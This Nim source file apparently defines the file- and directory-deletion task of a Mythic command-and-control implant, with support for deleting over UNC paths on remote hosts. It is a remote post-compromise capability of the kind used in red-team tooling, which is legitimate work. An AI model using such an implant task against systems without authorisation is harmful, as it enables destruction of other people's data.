## Remove file or directory task
## Deletes files or directories from the filesystem

import std/[json, os, strformat, strutils]
import ../config
import ../utils/mythic_responses

proc rm*(taskId: string, params: JsonNode): JsonNode =
  ## Remove (delete) a file or directory
  let cfg = getConfig()
  
  try:
    # Parse parameters
    let pathParam = params["path"].getStr()
    let host = if params.hasKey("host"): params["host"].getStr() else: ""
    
    # Build UNC path if host is provided
    let path = if host.len > 0:
      # Remove leading/trailing backslashes from path
      let cleanPath = pathParam.strip(chars = {'\\', '/'})
      # Build UNC path: \\host\share
      "\\\\" & host & "\\" & cleanPath
    elif pathParam.startsWith("\\\\") or isAbsolute(pathParam):
      pathParam
    else:
      getCurrentDir() / pathParam
    
    if cfg.debug:
      echo &"[DEBUG] Removing: {path}"
    
    # Check if path exists
    if not fileExists(path) and not dirExists(path):
      return mythicError(taskId, &"Error: Path does not exist: {path}")
    
    # Determine if it's a file or directory
    if fileExists(path):
      removeFile(path)
      return mythicSuccess(taskId, &"Successfully removed file: {path}")
    elif dirExists(path):
      removeDir(path)
      return mythicSuccess(taskId, &"Successfully removed directory: {path}")
    else:
      return mythicError(taskId, &"Error: Unknown path type: {path}")
      
  except OSError as e:
    return mythicError(taskId, &"Error removing path: {e.msg}")
  except:
    let e = getCurrentException()
    return mythicError(taskId, &"Error: {e.msg}")
